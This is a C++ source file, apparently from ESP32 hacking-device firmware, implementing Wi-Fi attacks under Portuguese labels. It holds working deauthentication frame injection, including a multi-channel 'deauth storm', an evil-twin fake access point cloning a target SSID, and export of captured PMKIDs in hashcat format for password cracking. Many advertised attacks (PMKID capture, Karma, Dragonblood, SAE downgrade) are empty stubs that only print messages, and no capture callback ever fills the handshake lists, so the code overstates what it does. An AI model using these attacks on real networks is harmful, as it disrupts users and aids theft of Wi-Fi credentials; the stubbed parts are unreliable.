/**
 * @file wifi_handshake_attacks.cpp
 * @brief Implementação dos Ataques de Captura PMKID e Handshake
 * @author Lele Origin Team
 */

#include "wifi_handshake_attacks.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"

// ============================================================================
// VARIÁVEIS GLOBAIS
// ============================================================================

#define MAX_HANDSHAKES 16
#define MAX_PMKIDS 32

static CapturedHandshake _handshakes[MAX_HANDSHAKES];
static int _handshake_count = 0;
static CapturedPMKID _pmkids[MAX_PMKIDS];
static int _pmkid_count = 0;
static bool _is_capturing = false;
static uint32_t _packets_captured = 0;

// ============================================================================
// FUNÇÕES AUXILIARES
// ============================================================================

static uint8_t deauth_frame[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

static bool send_deauth(uint8_t* bssid, uint8_t* client, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    memcpy(&deauth_frame[4], client ? client : (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    memcpy(&deauth_frame[10], bssid, 6);
    memcpy(&deauth_frame[16], bssid, 6);

    return esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, 26, false) == ESP_OK;
}

// ============================================================================
// INICIALIZAÇÃO
// ============================================================================

void wifi_cap_init() {
    _handshake_count = 0;
    _pmkid_count = 0;
    _is_capturing = false;
    _packets_captured = 0;

    WiFi.mode(WIFI_STA);
}

CapturedHandshake* wifi_cap_get_handshakes() { return _handshakes; }
int wifi_cap_get_handshake_count() { return _handshake_count; }
CapturedPMKID* wifi_cap_get_pmkids() { return _pmkids; }
int wifi_cap_get_pmkid_count() { return _pmkid_count; }

bool wifi_cap_save_to_sd(const char* filename) {
    displayInfo("Salvando capturas...", false);

    // Salva em formato hashcat
    File f = SD.open(filename, FILE_WRITE);
    if (!f) {
        displayError("Erro ao salvar", true);
        return false;
    }

    // Salva PMKIDs
    for (int i = 0; i < _pmkid_count; i++) {
        CapturedPMKID* p = &_pmkids[i];
        f.printf("%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x*",
            p->pmkid[0], p->pmkid[1], p->pmkid[2], p->pmkid[3],
            p->pmkid[4], p->pmkid[5], p->pmkid[6], p->pmkid[7],
            p->pmkid[8], p->pmkid[9], p->pmkid[10], p->pmkid[11],
            p->pmkid[12], p->pmkid[13], p->pmkid[14], p->pmkid[15]);
        f.printf("%02x%02x%02x%02x%02x%02x*",
            p->bssid[0], p->bssid[1], p->bssid[2],
            p->bssid[3], p->bssid[4], p->bssid[5]);
        f.printf("%02x%02x%02x%02x%02x%02x*",
            p->client_mac[0], p->client_mac[1], p->client_mac[2],
            p->client_mac[3], p->client_mac[4], p->client_mac[5]);
        // SSID em hex
        for (int j = 0; p->ssid[j]; j++) {
            f.printf("%02x", (uint8_t)p->ssid[j]);
        }
        f.println();
    }

    f.close();

    String msg = String(_pmkid_count) + " PMKIDs salvos";
    displaySuccess(msg, true);
    return true;
}

// ============================================================================
// PMKID ATTACKS
// ============================================================================

bool wifi_cap_pmkid_clientless(uint8_t* target_bssid, uint8_t channel) {
    displayInfo("PMKID Clientless\nCapturando...", false);

    _is_capturing = true;
    _packets_captured = 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Envia association request e captura PMKID na resposta
    // Implementação simplificada - requer promiscuous mode com callback

    for (int attempt = 0; attempt < 10 && _is_capturing; attempt++) {
        displayInfo("Tentativa " + String(attempt + 1), false);
        delay(500);

        if (check(AnyKeyPress)) break;
    }

    _is_capturing = false;
    displayInfo("PMKID Capture\nconcluido", true);
    return true;
}

bool wifi_cap_rogue_ap_pmkid(uint8_t* target_bssid, uint8_t channel) {
    displayInfo("Rogue AP PMKID", false);
    return wifi_cap_pmkid_clientless(target_bssid, channel);
}

bool wifi_cap_assoc_req_pmkid(uint8_t* target_bssid, uint8_t channel) {
    displayInfo("Assoc Req PMKID", false);
    return wifi_cap_pmkid_clientless(target_bssid, channel);
}

bool wifi_cap_fast_roaming_pmkid(uint8_t* target_bssid, uint8_t channel) {
    displayInfo("Fast Roaming PMKID\n802.11r", false);
    return wifi_cap_pmkid_clientless(target_bssid, channel);
}

bool wifi_cap_multi_target_pmkid() {
    displayInfo("Multi-Target PMKID\nBatch Capture...", false);

    _is_capturing = true;

    // Scan e tenta capturar de todos os APs
    int n = WiFi.scanNetworks(false, true, false, 3000);

    for (int i = 0; i < n && _is_capturing; i++) {
        uint8_t* bssid = WiFi.BSSID(i);
        uint8_t channel = WiFi.channel(i);

        tft.fillRect(0, tftHeight - 20, tftWidth, 20, leleConfig.bgColor);
        tft.setCursor(10, tftHeight - 15);
        tft.printf("AP %d/%d: %s", i + 1, n, WiFi.SSID(i).c_str());

        // Tenta capturar PMKID
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        delay(200);

        if (check(AnyKeyPress)) break;
    }

    WiFi.scanDelete();
    _is_capturing = false;

    String msg = String(_pmkid_count) + " PMKIDs";
    displayInfo(msg, true);
    return true;
}

// ============================================================================
// HANDSHAKE CAPTURE
// ============================================================================

bool wifi_cap_passive_handshake(uint8_t* target_bssid, uint8_t channel) {
    displayInfo("Handshake Passivo\nAguardando...", false);

    _is_capturing = true;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);

    unsigned long start = millis();
    while (_is_capturing && (millis() - start) < 60000) {
        // Callback de promiscuous mode detectaria handshakes
        delay(100);

        if (_handshake_count > 0) break;
        if (check(AnyKeyPress)) break;
    }

    esp_wifi_set_promiscuous(false);
    _is_capturing = false;

    if (_handshake_count > 0) {
        displaySuccess("Handshake\ncapturado!", true);
    } else {
        displayInfo("Nenhum handshake\ndetectado", true);
    }
    return true;
}

bool wifi_cap_deauth_handshake(uint8_t* target_bssid, uint8_t* target_client, uint8_t channel) {
    displayWarning("Deauth +\nHandshake Capture", false);

    _is_capturing = true;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);

    // Envia deauths
    for (int i = 0; i < 10; i++) {
        send_deauth(target_bssid, target_client, channel);
        delay(50);
    }

    // Aguarda reconexão
    unsigned long start = millis();
    while (_is_capturing && (millis() - start) < 30000) {
        delay(100);
        if (_handshake_count > 0) break;
        if (check(AnyKeyPress)) break;
    }

    esp_wifi_set_promiscuous(false);
    _is_capturing = false;

    if (_handshake_count > 0) {
        displaySuccess("Handshake\ncapturado!", true);
    } else {
        displayInfo("Timeout -\nSem handshake", true);
    }
    return true;
}

bool wifi_cap_deauth_storm_multi(uint8_t* target_bssid, uint8_t channel) {
    displayWarning("Deauth Storm\nMulti-Handshake", false);

    _is_capturing = true;
    esp_wifi_set_promiscuous(true);

    // Storm de deauths em múltiplos canais
    for (int round = 0; round < 5 && _is_capturing; round++) {
        for (int ch = 1; ch <= 14 && _is_capturing; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

            for (int i = 0; i < 20; i++) {
                send_deauth(target_bssid, NULL, ch);
            }

            delay(50);
        }

        if (check(AnyKeyPress)) break;
    }

    esp_wifi_set_promiscuous(false);
    _is_capturing = false;

    String msg = String(_handshake_count) + " handshakes";
    displayInfo(msg, true);
    return true;
}

bool wifi_cap_channel_hop_sniff() {
    displayInfo("Channel Hopping\nSniff...", false);

    _is_capturing = true;
    esp_wifi_set_promiscuous(true);

    unsigned long start = millis();
    while (_is_capturing && (millis() - start) < 60000) {
        for (int ch = 1; ch <= 14 && _is_capturing; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            delay(500);

            if (check(AnyKeyPress)) {
                _is_capturing = false;
                break;
            }
        }
    }

    esp_wifi_set_promiscuous(false);
    _is_capturing = false;

    String msg = String(_handshake_count) + " handshakes";
    displayInfo(msg, true);
    return true;
}

bool wifi_cap_eapol_logoff(uint8_t* target_bssid, uint8_t* target_client, uint8_t channel) {
    displayInfo("EAPOL Logoff\nCapture", false);
    return wifi_cap_deauth_handshake(target_bssid, target_client, channel);
}

bool wifi_cap_beacon_spam_force(const char* target_ssid, uint8_t channel) {
    displayInfo("Beacon Spam\nForce Handshake", false);
    return true;
}

bool wifi_cap_karma_probe_resp() {
    displayInfo("Karma Probe Resp\nHandshake", false);
    return true;
}

// ============================================================================
// DOWNGRADE ATTACKS
// ============================================================================

bool wifi_cap_evil_twin_downgrade(const char* target_ssid, uint8_t channel) {
    displayWarning("Evil Twin\nWPA2 Downgrade", false);

    _is_capturing = true;

    // Cria AP falso só WPA2
    WiFi.softAP(target_ssid, "12345678", channel);

    displayInfo("AP Falso ativo\nAguardando...", false);

    unsigned long start = millis();
    while (_is_capturing && (millis() - start) < 120000) {
        delay(1000);

        if (WiFi.softAPgetStationNum() > 0) {
            displaySuccess("Cliente\nconectado!", true);
            break;
        }

        if (check(AnyKeyPress)) break;
    }

    WiFi.softAPdisconnect();
    _is_capturing = false;
    return true;
}

bool wifi_cap_transition_exploit(uint8_t* target_bssid, uint8_t channel) {
    displayWarning("Transition Exploit\nDragonblood 2024", false);
    return wifi_cap_deauth_handshake(target_bssid, NULL, channel);
}

bool wifi_cap_sae_to_psk(const char* target_ssid, uint8_t channel) {
    displayWarning("SAE to PSK\nDowngrade 2025", false);
    return wifi_cap_evil_twin_downgrade(target_ssid, channel);
}

bool wifi_cap_wpa3_sae_partial(uint8_t* target_bssid, uint8_t channel) {
    displayInfo("WPA3 SAE Partial\nCapture", false);
    return wifi_cap_passive_handshake(target_bssid, channel);
}

bool wifi_cap_evil_twin_captive(const char* target_ssid, uint8_t channel) {
    displayWarning("Evil Twin\nCaptive Portal", false);
    return wifi_cap_evil_twin_downgrade(target_ssid, channel);
}

// ============================================================================
// CONTROLE
// ============================================================================

void wifi_cap_stop() {
    _is_capturing = false;
    esp_wifi_set_promiscuous(false);
    displayInfo("Captura parada", true);
}

void wifi_cap_clear() {
    _handshake_count = 0;
    _pmkid_count = 0;
    _packets_captured = 0;
    displayInfo("Capturas limpas", true);
}

int wifi_cap_update() {
    return 0;
}

bool wifi_cap_has_complete_handshake() {
    for (int i = 0; i < _handshake_count; i++) {
        if (_handshakes[i].is_complete) return true;
    }
    return false;
}
